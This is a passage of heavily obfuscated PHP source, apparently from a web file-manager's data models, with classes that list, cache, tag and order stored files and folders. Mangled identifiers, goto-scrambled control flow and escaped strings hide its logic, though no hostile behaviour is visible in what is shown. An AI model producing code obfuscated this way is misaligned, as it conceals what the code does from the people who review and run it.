$FÏ©ƒ­˜ò³ => $e»ğ¨äĞç¡) { if ($FŸÎ”±½ò˜ || in_array($FÏ©ƒ­˜ò³, $this->jsonField)) { $F‘¶¨¼ëß[$FÏ©ƒ­˜ò³] = json_decode($e»ğ¨äĞç¡, !0); } } goto A‘¨œÔ´‹ñ; fÈšæ¡Ù¨¶: $c¢É…°Ó– =& $_SERVER[±á õÁ]; $F‘¶¨¼ëß = $this->cacheGet($bÆŞÇÄÂÚÍ); $f„Øãó²Ùñ = $this->optionDefault($bÆŞÇÄÂÚÍ); goto DÖƒÏºÈ‰¹; fÒÙÑåˆ: } public function set($E£ÕÃ””®, $F¯…¶™ø…Ğ = false, $e÷Ã†®ˆ× = '') { goto a‹±éƒÅ²; D¨‹òƒÎ: return $this->addAll($B•Š’¶ÀĞÅ, array(), !0); goto aÃ±‚‚ïĞÖ; dÇ¨ˆ±Öñí: $bö†ƒ©×ÕÏ = is_array($E£ÕÃ””®) ? $E£ÕÃ””® : array($E£ÕÃ””® => $F¯…¶™ø…Ğ); foreach ($bö†ƒ©×ÕÏ as $BŞİõ«öŠ§ => $C¨ã¿”ğô) { if (is_array($C¨ã¿”ğô)) { $C¨ã¿”ğô = json_encode_force($C¨ã¿”ğô); } $this->checkLength($C¨ã¿”ğô, !1, $this->tableName . $e³õ®„ƒƒÉ[4] . $E£ÕÃ””®); $C¨ã¿”ğô = self::textEncode($C¨ã¿”ğô); $bö†ƒ©×ÕÏ = array($e³õ®„ƒƒÉ[39] => $e÷Ã†®ˆ×, $e³õ®„ƒƒÉ[99] => $BŞİõ«öŠ§, $e³õ®„ƒƒÉ[375] => $C¨ã¿”ğô); $B•Š’¶ÀĞÅ[] = $this->filterWhere($bö†ƒ©×ÕÏ); } if (!$B•Š’¶ÀĞÅ) { return !0; } goto D¨‹òƒÎ; a‹±éƒÅ²: $e³õ®„ƒƒÉ =& $_SERVER[±á õÁ]; $this->cacheRemove($e÷Ã†®ˆ×); $B•Š’¶ÀĞÅ = array(); goto dÇ¨ˆ±Öñí; aÃ±‚‚ïĞÖ: } protected function optionDefault($C®Æ»Çº = '') { return !1; } public function setDeep($A¢Ê“ùŠæø, $DéÔ½ÛÖõŒ = false, $A…‘øÃˆöƒ = '') { $eÔĞåîÏ‡Ú = explode($_SERVER[±á õÁ][101], $A¢Ê“ùŠæø); $C‡‚Ó†ÅÁ‡ = $this->get(); array_set_value($C‡‚Ó†ÅÁ‡, $A¢Ê“ùŠæø, $DéÔ½ÛÖõŒ); $this->set($eÔĞåîÏ‡Ú[0], $C‡‚Ó†ÅÁ‡[$eÔĞåîÏ‡Ú[0]], $A…‘øÃˆöƒ); } public function remove($a¼Óïì¨, $aÕ¹ˆÃ¾å® = '') { $a…ğÜ“¡ä =& $_SERVER[±á õÁ]; $this->cacheRemove($aÕ¹ˆÃ¾å®); $a®ôÖÁÊ©… = $this->filterWhere(array($a…ğÜ“¡ä[99] => $a¼Óïì¨, $a…ğÜ“¡ä[39] => $aÕ¹ˆÃ¾å®)); if (is_null($a¼Óïì¨)) { unset($a®ôÖÁÊ©…[$a…ğÜ“¡ä[99]]); } return $this->where($a®ôÖÁÊ©…)->delete(); } public function cacheSet($CÍòôš»äì, $BĞ“ÖŸ¼æõ = false) { return Cache::set($this->cacheKey($CÍòôš»äì), $BĞ“ÖŸ¼æõ); } public function cacheGet($fØŠ¬‡·ò) { return Cache::get($this->cacheKey($fØŠ¬‡·ò)); } public function cacheRemove($b†œ…Í—ã) { return Cache::remove($this->cacheKey($b†œ…Í—ã)); } protected function filterWhere($C·–¾ƒ½‡¨) { return $C·–¾ƒ½‡¨; } protected function cacheKey($Cõ­íá—¡) { return $Cõ­íá—¡; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\143\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\x6d\145" => "\x69\x6f\x5f\x73\x6f\x75\x72\x63\x65\137\155\145\x74\141", "\155\x65\x74\141\106\151\145\154\x64" => "\x73\x6f\x75\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\157\144\151\146\x79\124\151\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\145\x72\164", "\146\165\x6e\143\164\151\157\156"), array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\164\151\x6d\145", "\151\x6e\x73\145\162\x74", "\x66\x75\156\143\x74\151\x6f\156"), array("\166\x69\145\167\x54\x69\155\x65", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\x66\165\156\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($A¬ŒôÁäµ…) { return $this->listSource(array($_SERVER[±á õÁ][392] => $A¬ŒôÁäµ…)); } public function typeName($E½ÔóĞñõù) { static $C“Åêƒ”µ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $C“Åêƒ”µ[$E½ÔóĞñõù . $_SERVER[±á õÁ][43]]; } public function sourceListInfo($bÍ¢İ…¬, $Dº§ÃÈğ‰¿ = false) { goto E¶±¨„¹®ù; E¶±¨„¹®ù: $FÊİóƒ”‘Ì =& $_SERVER[±á õÁ]; $bÍ¢İ…¬ = $bÍ¢İ…¬ ? $bÍ¢İ…¬ : array(); $bÍ¢İ…¬ = array_filter(array_unique($bÍ¢İ…¬)); goto c™Õ²†Ç•Í; EÀÅˆÚíà¿: return array_to_keyvalue($aöàÜ»çˆ¯, $FÊİóƒ”‘Ì[393]); goto bÃ¢ç«ñàÌ; c™Õ²†Ç•Í: if (!$bÍ¢İ…¬) { return array(); } $aöàÜ»çˆ¯ = $this->where(array($FÊİóƒ”‘Ì[393] => array($FÊİóƒ”‘Ì[7], $bÍ¢İ…¬)))->select(); $this->_listDataApply($aöàÜ»çˆ¯, $Dº§ÃÈğ‰¿); goto EÀÅˆÚíà¿; bÃ¢ç«ñàÌ: } public function pathInfoFilter($EæËÆÔ‘) { goto Aè³ÏËã•ë; BŠÒËé ß: $EæËÆÔ‘[$F“’ßù‰ªª[395]] = $this->typeName($EæËÆÔ‘[$F“’ßù‰ªª[395]]); if ($EæËÆÔ‘[$F“’ßù‰ªª[394]] != 1) { $EæËÆÔ‘[$F“’ßù‰ªª[175]] = $EæËÆÔ‘[$F“’ßù‰ªª[396]]; unset($EæËÆÔ‘[$F“’ßù‰ªª[396]]); } $bÇ¼òğ°ß = $F“’ßù‰ªª[397]; goto DÑä”ØÚŸÚ; DÑä”ØÚŸÚ: $bÇ¼òğ°ß .= $F“’ßù‰ªª[398]; $bÇ¼òğ°ß .= $F“’ßù‰ªª[399]; $D¦íîÔ¸Ñ¦ = explode($F“’ßù‰ªª[57], $bÇ¼òğ°ß); goto FïºÍ‰†öí; Aè³ÏËã•ë: $F“’ßù‰ªª =& $_SERVER[±á õÁ]; $EæËÆÔ‘[$F“’ßù‰ªª[85]] = KodIO::make($EæËÆÔ‘[$F“’ßù‰ªª[393]]); $EæËÆÔ‘[$F“’ßù‰ªª[39]] = $EæËÆÔ‘[$F“’ßù‰ªª[394]] == 1 ? $F“’ßù‰ªª[86] : $F“’ßù‰ªª[181]; goto BŠÒËé ß; FïºÍ‰†öí: if (isset($EæËÆÔ‘[$F“’ßù‰ªª[400]]) && $EæËÆÔ‘[$F“’ßù‰ªª[400]][$F“’ßù‰ªª[401]] == -1) { $D¦íîÔ¸Ñ¦ = array_remove_value($D¦íîÔ¸Ñ¦, $F“’ßù‰ªª[200]); $D¦íîÔ¸Ñ¦ = array_remove_value($D¦íîÔ¸Ñ¦, $F“’ßù‰ªª[117]); $D¦íîÔ¸Ñ¦ = array_remove_value($D¦íîÔ¸Ñ¦, $F“’ßù‰ªª[402]); $D¦íîÔ¸Ñ¦ = array_remove_value($D¦íîÔ¸Ñ¦, $F“’ßù‰ªª[403]); $D¦íîÔ¸Ñ¦ = array_remove_value($D¦íîÔ¸Ñ¦, $F“’ßù‰ªª[87]); $D¦íîÔ¸Ñ¦ = array_remove_value($D¦íîÔ¸Ñ¦, $F“’ßù‰ªª[404]); } $EæËÆÔ‘ = array_field_key($EæËÆÔ‘, $D¦íîÔ¸Ñ¦); return $EæËÆÔ‘; goto f£Ó°Ä¼Ë; f£Ó°Ä¼Ë: } public function listUserFav() { goto aåŠò¤Ïšµ; aåŠò¤Ïšµ: $B£Ä•ƒòãÁ =& $_SERVER[±á õÁ]; $f´À¬Çˆ¹° = Model($B£Ä•ƒòãÁ[405])->listData(); $f×¼ó¬µ¤¦ = array_filter_by_field($f´À¬Çˆ¹°, $B£Ä•ƒòãÁ[39], $B£Ä•ƒòãÁ[406]); goto bÅ¿İÅïµ; bÅ¿İÅïµ: $f×¼ó¬µ¤¦ = array_to_keyvalue($f×¼ó¬µ¤¦, $B£Ä•ƒòãÁ[43], $B£Ä•ƒòãÁ[85]); if ($f×¼ó¬µ¤¦) { $e¡†ßîõ¸ = $this->listSource(array($B£Ä•ƒòãÁ[407] => array($B£Ä•ƒòãÁ[408], $f×¼ó¬µ¤¦))); } $e¡†ßîõ¸ = array_to_keyvalue($e¡†ßîõ¸[$B£Ä•ƒòãÁ[370]], $B£Ä•ƒòãÁ[393]); goto E„÷ÌŠÃ“ñ; E„÷ÌŠÃ“ñ: foreach ($f´À¬Çˆ¹° as &$a®¼Ì³‹¸Â) { $a®¼Ì³‹¸Â = array($B£Ä•ƒòãÁ[409] => $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[391]], $B£Ä•ƒòãÁ[410] => $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[38]], $B£Ä•ƒòãÁ[411] => $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[85]], $B£Ä•ƒòãÁ[412] => $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[39]], $B£Ä•ƒòãÁ[413] => $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[200]], $B£Ä•ƒòãÁ[414] => $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[117]]); if ($a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[39]] == $B£Ä•ƒòãÁ[406] && $e¡†ßîõ¸[$a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[85]]]) { $a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[415]] = $e¡†ßîõ¸[$a®¼Ì³‹¸Â[$B£Ä•ƒòãÁ[85]]]; } } unset($a®¼Ì³‹¸Â); return $f´À¬Çˆ¹°; goto E¼æò‰©ñ; E¼æò‰©ñ: } public function listUserTag($Bº’ğö£íö) { goto EÊÓ‹Ú÷¿; E†œÊİÃ•Ğ: $c‡‘µˆãĞ = array(); foreach ($F¸‰‡Õòï as $A’ËˆÜÛğ¼) { $Aß†ïÒ‡ñõ = $A’ËˆÜÛğ¼[$CöÌ£†¿ß¯[85]]; if (!$Aß†ïÒ‡ñõ) { continue; } if (!isset($c‡‘µˆãĞ[$Aß†ïÒ‡ñõ])) { $c‡‘µˆãĞ[$Aß†ïÒ‡ñõ] = array(); } $c‡‘µˆãĞ[$Aß†ïÒ‡ñõ][] = $A’ËˆÜÛğ¼[$CöÌ£†¿ß¯[417]]; } $cÎ°í§¼•µ = array(); goto e™‹—¨—; E´“÷¸¹÷š: $fì‚” Ë‘è = array_to_keyvalue($dì«Œƒ«å[$CöÌ£†¿ß¯[83]], $CöÌ£†¿ß¯[43], $CöÌ£†¿ß¯[393]); $f˜ÛÅÃ¶ = array_merge($fì‚” Ë‘è, $dî½ø»èõ˜); foreach ($cÎ°í§¼•µ as $Aß†ïÒ‡ñõ) { if (!in_array($Aß†ïÒ‡ñõ, $f˜ÛÅÃ¶)) { $B»Àâ–‡Øµ[] = $Aß†ïÒ‡ñõ; } } goto Eâ¹³ìÈ¸İ; EÊÓ‹Ú÷¿: $CöÌ£†¿ß¯ =& $_SERVER[±á õÁ]; if ($Bº’ğö£íö && !is_array($Bº’ğö£íö)) { $Bº’ğö£íö = array($Bº’ğö£íö); } $F¸‰‡Õòï = Model($CöÌ£†¿ß¯[416])->listData(); goto E†œÊİÃ•Ğ; eÁ‹Û‘ˆÄ: if (!$dì«Œƒ«å || count($cÎ°í§¼•µ) == $dì«Œƒ«å[$CöÌ£†¿ß¯[367]][$CöÌ£†¿ß¯[368]]) { return $dì«Œƒ«å; } $B»Àâ–‡Øµ = array(); $dî½ø»èõ˜ = array_to_keyvalue($dì«Œƒ«å[$CöÌ£†¿ß¯[84]], $CöÌ£†¿ß¯[43], $CöÌ£†¿ß¯[393]); goto E´“÷¸¹÷š; Eâ¹³ìÈ¸İ: if ($B»Àâ–‡Øµ) { Model($CöÌ£†¿ß¯[418])->removeBySource($B»Àâ–‡Øµ); } return $dì«Œƒ«å; goto dÙ®¬è£Ú¯; e™‹—¨—: foreach ($c‡‘µˆãĞ as $DåÛãÇŠ†ä => $fÆ êó­ÁÒ) { $f»ºª®Ğí = !0; if (!$Bº’ğö£íö) { $cÎ°í§¼•µ[] = $DåÛãÇŠ†ä; continue; } foreach ($Bº’ğö£íö as $a‡Êù‚•‘) { if (!in_array($a‡Êù‚•‘, $fÆ êó­ÁÒ)) { $f»ºª®Ğí = !1; break; } } if ($f»ºª®Ğí) { $cÎ°í§¼•µ[] = $DåÛãÇŠ†ä; } } if (!$cÎ°í§¼•µ) { return array(); } $dì«Œƒ«å = $this->listSource(array($CöÌ£†¿ß¯[407] => array($CöÌ£†¿ß¯[408], $cÎ°í§¼•µ))); goto eÁ‹Û‘ˆÄ; dÙ®¬è£Ú¯: } public function listUserRecycle() { $AÈ°×‰¬¿ =& $_SERVER[±á õÁ]; $a¦õÃ‰–ˆø = Model($AÈ°×‰¬¿[419])->listData(); if (!$a¦õÃ‰–ˆø) { return array(); } $D¹¢¸ìñÃÇ = array($AÈ°×‰¬¿[407] => array($AÈ°×‰¬¿[408], $a¦õÃ‰–ˆø), $AÈ°×‰¬¿[420] => 1); return $this->listSource($D¹¢¸ìñÃÇ); } public function listSource($d›èœæ—©°, $eœš˜£ä©ì = 3000) { goto AÁŞ©ÇÅ·; bÔÔÔì‘‡: $fÔ±Šõ¾´ = $this->field($C¹áø„İ)->_makeOrder()->where($d›èœæ—©°)->selectPage($eœš˜£ä©ì); $this->_listDataApply($fÔ±Šõ¾´[$e­ââÜ’Ã¯[370]]); $this->_listMake($fÔ±Šõ¾´); goto cºšÄ¯¦Ù´; cºšÄ¯¦Ù´: return $fÔ±Šõ¾´; goto Bµ÷×¨Ç™æ; AÁŞ©ÇÅ·: $e­ââÜ’Ã¯ =& $_SERVER[±á õÁ]; if (!isset($d›èœæ—©°[$e­ââÜ’Ã¯[421]])) { $d›èœæ—©°[$e­ââÜ’Ã¯[421]] = 0; } $C¹áø„İ = $e­ââÜ’Ã¯[422]; goto bÔÔÔì‘‡; Bµ÷×¨Ç™æ: } protected function _makeOrder() { goto DÖ»ô‰•¯; DÖ»ô‰•¯: $a«Àø†Œ§ =& $_SERVER[±á õÁ]; $eò††²µì = Model($a«Àø†Œ§[423])->get($a«Àø†Œ§[424]); $fßÀË°Åò = Model($a«Àø†Œ§[423])->get($a«Àø†Œ§[425]); goto Dö–¦¥èâ›; d¾ŒÀÇùİ±: if ($Eù¥¢’Ÿ†À == $a«Àø†Œ§[38]) { } $b¦–…Œ°Éá = $a«Àø†Œ§[433] . $dÌÁ¶¼À½ğ[$Eù¥¢’Ÿ†À] . $a«Àø†Œ§[60] . $A±Ã£²ğïÓ[$f¥Û• éšê]; return $this->order(rtrim(trim($b¦–…Œ°Éá), $a«Àø†Œ§[57])); goto d£¬¾†Š; aÇŸÈŒÔ…Á: $f¥Û• éšê = Input::get($a«Àø†Œ§[432], $a«Àø†Œ§[7], $fßÀË°Åò, array_keys($A±Ã£²ğïÓ)); if (!in_array($Eù¥¢’Ÿ†À, array_keys($dÌÁ¶¼À½ğ))) { $Eù¥¢’Ÿ†À = $a«Àø†Œ§[38]; } if (!in_array($f¥Û• éšê, array_keys($A±Ã£²ğïÓ))) { $Eù¥¢’Ÿ†À = $a«Àø†Œ§[426]; } goto d¾ŒÀÇùİ±; Dö–¦¥èâ›: $A±Ã£²ğïÓ = array($a«Àø†Œ§[426] => $a«Àø†Œ§[427], $a«Àø†Œ§[428] => $a«Àø†Œ§[429]); $dÌÁ¶¼À½ğ = array($a«Àø†Œ§[38] => $a«Àø†Œ§[38], $a«Àø†Œ§[87] => $a«Àø†Œ§[87], $a«Àø†Œ§[175] => $a«Àø†Œ§[396], $a«Àø†Œ§[402] => $a«Àø†Œ§[402], $a«Àø†Œ§[430] => $a«Àø†Œ§[403], $a«Àø†Œ§[200] => $a«Àø†Œ§[200], $a«Àø†Œ§[117] => $a«Àø†Œ§[117]); $Eù¥¢’Ÿ†À = Input::get($a«Àø†Œ§[431], $a«Àø†Œ§[7], $eò††²µì, array_keys($dÌÁ¶¼À½ğ)); goto aÇŸÈŒÔ…Á; d£¬¾†Š: } protected function _listDataApplyItem($C–›‡¯°É, $bØÛêƒ±ÏÆ = false) { $B†ãöÃÙñ = array($C–›‡¯°É); $this->_listDataApply($B†ãöÃÙñ, $bØÛêƒ±ÏÆ); return $B†ãöÃÙñ[0]; } protected function _listDataApply(&$bÇ¹ò‹šëÇ, $dİ‚¡øˆŒ¯ = false) { goto a‘‚¶™ë; a‘‚¶™ë: $c³­ÄÇ¡Ù =& $_SERVER[±á õÁ]; if (!$bÇ¹ò‹šëÇ) { $bÇ¹ò‹šëÇ = array(); return; } $câÌ‚Õí© = array_to_keyvalue($bÇ¹ò‹šëÇ, $c³­ÄÇ¡Ù[43], $c³­ÄÇ¡Ù[393]); goto cÉÆ¯Ğ°¶È; cÉÆ¯Ğ°¶È: $câÌ‚Õí© = array_unique($câÌ‚Õí©); $this->_listSourceCache($bÇ¹ò‹šëÇ); if (!$dİ‚¡øˆŒ¯) { $this->_listAppendMeta($bÇ¹ò‹šëÇ, $câÌ‚Õí©); $this->_listAppendFileMeta($bÇ¹ò‹šëÇ, $câÌ‚Õí©); $this->_listAppendChildren($bÇ¹ò‹šëÇ, $câÌ‚Õí©); } goto c’ÖõØ¬¸ß; B¿¡ŞÇ¨£Ğ: $this->_listAppendUser($bÇ¹ò‹šëÇ); $this->_listFilterInfo($bÇ¹ò‹šëÇ, $dİ‚¡øˆŒ¯); goto cé¤Ô®Á¢±; c’ÖõØ¬¸ß: $this->_listAppendPath($bÇ¹ò‹šëÇ); $this->_listAppendAuth($bÇ¹ò‹šëÇ); $this->_listAppendSourceInfo($bÇ¹ò‹šëÇ, $câÌ‚Õí©); goto B¿¡ŞÇ¨£Ğ; cé¤Ô®Á¢±: } protected function _listSourceCache($e±¢êÊ“Ê) { $Cæîœ¢£÷Ê =& $_SERVER[±á õÁ]; foreach ($e±¢êÊ“Ê as $F¡àÄòÎà‘) { self::$cacheSourceInfo[$Cæîœ¢£÷Ê[434] . $F¡àÄòÎà‘[$Cæîœ¢£÷Ê[393]]] = $F¡àÄòÎà‘; } } protected function _listFilterInfo(&$eÕáœå¡İ, $f‡¯õ”“Úƒ = false) { $B‡ùÍª¾‚Ò =& $_SERVER[±á õÁ]; foreach ($eÕáœå¡İ as &$D„ôÆ‘ˆ›‡) { $D„ôÆ‘ˆ›‡ = $this->pathInfoFilter($D„ôÆ‘ˆ›‡); self::$cachePathInfo[$B‡ùÍª¾‚Ò[435] . intval($f‡¯õ”“Úƒ) . $B‡ùÍª¾‚Ò[436] . $D„ôÆ‘ˆ›‡[$B‡ùÍª¾‚Ò[393]]] = $D„ôÆ‘ˆ›‡; } unset($D„ôÆ‘ˆ›‡); } protected function _listMake(&$f¹™İ‚«„‹) { $Cæ¼”Ù×„ =& $_SERVER[±á õÁ]; $f¹™İ‚«„‹[$Cæ¼”Ù×„[84]] = array(); $f¹™İ‚«„‹[$Cæ¼”Ù×„[83]] = array(); foreach ($f¹™İ‚«„‹[$Cæ¼”Ù×„[370]] as $B’Œ‘°æ) { $FòÙÎ¼‰¼ = $B’Œ‘°æ[$Cæ¼”Ù×„[394]] == 1 ? $Cæ¼”Ù×„[84] : $Cæ¼”Ù×„[83]; $f¹™İ‚«„‹[$FòÙÎ¼‰¼][] = $B’Œ‘°æ; } unset($f¹™İ‚«„‹[$Cæ¼”Ù×„[370]]); } protected function _listAppendMeta(&$CÁ”×èĞ×Ç, $CÆ¹´„¯ŠÎ) { goto CÉ¥‚Šœ‹½; CŠœŞ¯óØ”: if (!$D‰ÓœÒŞ) { return; } $aÚ„Ú‘ôº = array($FíÂ˜íáĞº[439], $FíÂ˜íáĞº[440]); $bö•‡¦—Ú¤ = array(); goto AËé‰•ë; CÉ¥‚Šœ‹½: $FíÂ˜íáĞº =& $_SERVER[±á õÁ]; $DÜ©»Ö‡ã = array($FíÂ˜íáĞº[407] => array($FíÂ˜íáĞº[408], $CÆ¹´„¯ŠÎ)); $D‰ÓœÒŞ = Model($FíÂ˜íáĞº[437])->field($FíÂ˜íáĞº[438])->where($DÜ©»Ö‡ã)->select(); goto CŠœŞ¯óØ”; AËé‰•ë: foreach ($D‰ÓœÒŞ as $Aæí¹´¼ó…) { if (!isset($bö•‡¦—Ú¤[$Aæí¹´¼ó…[$FíÂ˜íáĞº[393]]])) { $bö•‡¦—Ú¤[$Aæí¹´¼ó…[$FíÂ˜íáĞº[393]]] = array(); } if (in_array($Aæí¹´¼ó…[$FíÂ˜íáĞº[99]], $aÚ„Ú‘ôº)) { continue; } $bö•‡¦—Ú¤[$Aæí¹´¼ó…[$FíÂ˜íáĞº[393]]][$Aæí¹´¼ó…[$FíÂ˜íáĞº[99]]] = $Aæí¹´¼ó…[$FíÂ˜íáĞº[375]]; } foreach ($CÁ”×èĞ×Ç as &$CÈ‹Îø†) { $CÈ‹Îø†[$FíÂ˜íáĞº[441]] = !1; if (isset($bö•‡¦—Ú¤[$CÈ‹Îø†[$FíÂ˜íáĞº[393]]])) { $CÈ‹Îø†[$FíÂ˜íáĞº[441]] = $bö•‡¦—Ú¤[$CÈ‹Îø†[$FíÂ˜íáĞº[393]]]; } if ($this->fileIsLock($CÈ‹Îø†) && $CÈ‹Îø†[$FíÂ˜íáĞº[400]]) { $A¹‚¿¶é = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $CÈ‹Îø†[$FíÂ˜íáĞº[400]][$FíÂ˜íáĞº[401]] = AuthModel::authDisable($CÈ‹Îø†[$FíÂ˜íáĞº[400]][$FíÂ˜íáĞº[401]], $A¹‚¿¶é); $CÈ‹Îø†[$FíÂ˜íáĞº[400]][$FíÂ˜íáĞº[442]][$FíÂ˜íáĞº[400]] = $CÈ‹Îø†[$FíÂ˜íáĞº[400]][$FíÂ˜íáĞº[401]]; } } unset($CÈ‹Îø†); goto aíóÄ£³; aíóÄ£³: } protected function _listAppendFileMeta(&$Cêß¨Ç§õ·, $DÇ‹µ­¾÷Ô) { goto DÛÕº¤Ù†Í; c§ğ°Ãˆ¥é: $E˜æºøïœ = $E˜æºøïœ ? $E˜æºøïœ : array(); $e³„‘Ãİƒ­ = array(); foreach ($E˜æºøïœ as $A ÈÅ¢È¤§) { if (!isset($e³„‘Ãİƒ­[$A ÈÅ¢È¤§[$F¨à·ƒ§Ü‰[443]]])) { $e³„‘Ãİƒ­[$A ÈÅ¢È¤§[$F¨à·ƒ§Ü‰[443]]] = array(); } $e³„‘Ãİƒ­[$A ÈÅ¢È¤§[$F¨à·ƒ§Ü‰[443]]][$A ÈÅ¢È¤§[$F¨à·ƒ§Ü‰[99]]] = $A ÈÅ¢È¤§[$F¨à·ƒ§Ü‰[375]]; } goto b¸ÇÀñ²“; b¸ÇÀñ²“: foreach ($Cêß¨Ç§õ· as &$Dê‹çóßÖ) { goto A¯½ª²¼í†; bÁ‡›±ÆÈÓ: $AÑº¿ñáÅª[$F¨à·ƒ§Ü‰[87]] = $Dê‹çóßÖ[$F¨à·ƒ§Ü‰[87]]; $AÑº¿ñáÅª[$F¨à·ƒ§Ü‰[38]] = $Dê‹çóßÖ[$F¨à·ƒ§Ü‰[38]]; if (!isset(self::$cacheFileInfo[$F¨à·ƒ§Ü‰[449] . $C‹ô¼´êÏ‚])) { self::$cacheFileInfo[$F¨à·ƒ§Ü‰[449] . $C‹ô¼´êÏ‚] = array_merge(array(), $AÑº¿ñáÅª); } goto d…ĞÂî‘Úœ; d…ĞÂî‘Úœ: unset($f±óš½µİµ[$C‹ô¼´êÏ‚][$F¨à·ƒ§Ü‰[85]]); $Dé‘—…£÷ = is_array($e³„‘Ãİƒ­[$C‹ô¼´êÏ‚]) ? $e³„‘Ãİƒ­[$C‹ô¼´êÏ‚] : array(); $Dê‹çóßÖ[$F¨à·ƒ§Ü‰[171]] = array_merge($Dé‘—…£÷, $f±óš½µİµ[$C‹ô¼´êÏ‚]); goto e®–ÉØÑ; A¯½ª²¼í†: $C‹ô¼´êÏ‚ = $Dê‹çóßÖ[$F¨à·ƒ§Ü‰[443]]; if (!$C‹ô¼´êÏ‚ || !isset($f±óš½µİµ[$C‹ô¼´êÏ‚])) { continue; } $AÑº¿ñáÅª = $f±óš½µİµ[$C‹ô¼´êÏ‚]; goto bÁ‡›±ÆÈÓ; e®–ÉØÑ: if (isset($Dê‹çóßÖ[$F¨à·ƒ§Ü‰[171]][$F¨à·ƒ§Ü‰[170]])) { $Dê‹çóßÖ[$F¨à·ƒ§Ü‰[170]] = json_decode($Dê‹çóßÖ[$F¨à·ƒ§Ü‰[171]][$F¨à·ƒ§Ü‰[170]], !0); unset($Dê‹çóßÖ[$F¨à·ƒ§Ü‰[171]][$F¨à·ƒ§Ü‰[170]]); } goto fÀ¬™—¢¦º; fÀ¬™—¢¦º: } unset($Dê‹çóßÖ); goto Bê—ê·Î™; DÛÕº¤Ù†Í: $F¨à·ƒ§Ü‰ =& $_SERVER[±á õÁ]; $e”ˆ ÍÑÂÁ = array_to_keyvalue($Cêß¨Ç§õ·, $F¨à·ƒ§Ü‰[43], $F¨à·ƒ§Ü‰[443]); $e”ˆ ÍÑÂÁ = array_filter(array_unique($e”ˆ ÍÑÂÁ)); goto DõäŠ½”Â‚; DõäŠ½”Â‚: if (!$e”ˆ ÍÑÂÁ) { return; } $båÚ§²Â›ò = array($F¨à·ƒ§Ü‰[444] => array($F¨à·ƒ§Ü‰[408], $e”ˆ ÍÑÂÁ)); $d“äéƒøì = $F¨à·ƒ§Ü‰[445]; goto aš„˜«Ä‡º; aš„˜«Ä‡º: $f±óš½µİµ = Model($F¨à·ƒ§Ü‰[446])->field($d“äéƒøì)->where($båÚ§²Â›ò)->select(); $f±óš½µİµ = array_to_keyvalue($f±óš½µİµ, $F¨à·ƒ§Ü‰[443]); $E˜æºøïœ = Model($F¨à·ƒ§Ü‰[447])->field($F¨à·ƒ§Ü‰[448])->where($båÚ§²Â›ò)->select(); goto c§ğ°Ãˆ¥é; Bê—ê·Î™: } protected function _listAppendSourceInfo(&$f¶‰ì ÎÜ‰, $f¯êíê•Ù¯) { goto bùƒÇëäÛÄ; e¦½¹¾¢Ç£: $b‹©Ùïàå› = array_to_keyvalue($EÉ‚Ï¶âø, $C™¡ÚÄğçÁ[391]); $dŸŞ‹ô‘· = array_to_keyvalue_group($f»¾Ñ’ñ¤, $C™¡ÚÄğçÁ[85], $C™¡ÚÄğçÁ[417]); $eÆØ½¶‹”ç = array_to_keyvalue($d‡÷­æÄ´, $C™¡ÚÄğçÁ[85]); goto f®ØÅßÑ§; c¡ï»ÓáÚÁ: $f»¾Ñ’ñ¤ = Model($C™¡ÚÄğçÁ[416])->listData(); $d‡÷­æÄ´ = Model($C™¡ÚÄğçÁ[405])->listData(); $Bù‚ïª£Æ‡ = Model($C™¡ÚÄğçÁ[452])->listSimple(); goto e¦½¹¾¢Ç£; f®ØÅßÑ§: $aë‰½ƒÌ÷Ò = array_to_keyvalue_group($Bù‚ïª£Æ‡, $C™¡ÚÄğçÁ[393]); foreach ($f¶‰ì ÎÜ‰ as &$B“­³º•) { $B“­³º•[$C™¡ÚÄğçÁ[415]] = array($C™¡ÚÄğçÁ[453] => 0, $C™¡ÚÄğçÁ[454] => 0, $C™¡ÚÄğçÁ[455] => 0); if (isset($eÆØ½¶‹”ç[$B“­³º•[$C™¡ÚÄğçÁ[393]]])) { $B“­³º•[$C™¡ÚÄğçÁ[415]][$C™¡ÚÄğçÁ[456]] = 1; $B“­³º•[$C™¡ÚÄğçÁ[415]][$C™¡ÚÄğçÁ[457]] = $eÆØ½¶‹”ç[$B“­³º•[$C™¡ÚÄğçÁ[393]]][$C™¡ÚÄğçÁ[38]]; } if (isset($dŸŞ‹ô‘·[$B“­³º•[$C™¡ÚÄğçÁ[393]]])) { $B“­³º•[$C™¡ÚÄğçÁ[415]][$C™¡ÚÄğçÁ[458]] = array(); foreach ($dŸŞ‹ô‘·[$B“­³º•[$C™¡ÚÄğçÁ[393]]] as $FÒ¸ÇÙßé) { $AŞ•‡ÉÄâ = $b‹©Ùïàå›[$FÒ¸ÇÙßé]; $B“­³º•[$C™¡ÚÄğçÁ[415]][$C™¡ÚÄğçÁ[458]][] = array($C™¡ÚÄğçÁ[459] => $AŞ•‡ÉÄâ[$C™¡ÚÄğçÁ[391]], $C™¡ÚÄğçÁ[410] => $AŞ•‡ÉÄâ[$C™¡ÚÄğçÁ[38]], $C™¡ÚÄğçÁ[460] => $AŞ•‡ÉÄâ[$C™¡ÚÄğçÁ[461]]); } } if (isset($aë‰½ƒÌ÷Ò[$B“­³º•[$C™¡ÚÄğçÁ[393]]])) { 